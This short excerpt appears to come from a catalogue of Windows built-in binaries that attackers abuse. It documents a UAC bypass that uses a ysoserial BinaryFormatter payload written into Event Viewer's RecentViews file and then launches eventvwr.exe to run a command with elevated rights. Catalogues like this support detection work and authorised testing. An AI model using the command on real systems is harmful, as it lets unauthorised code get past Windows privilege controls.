...
- Category: UAC Bypass
  Command: ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c "{CMD}" > RecentViews
    & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe
  ...
  - Application: GUI
  - Execute: .NetObjects
  Usecase: Execute a command to bypass security restrictions that limit the use of
...
- Jacob Gajek (Authored, 2018-11-01)
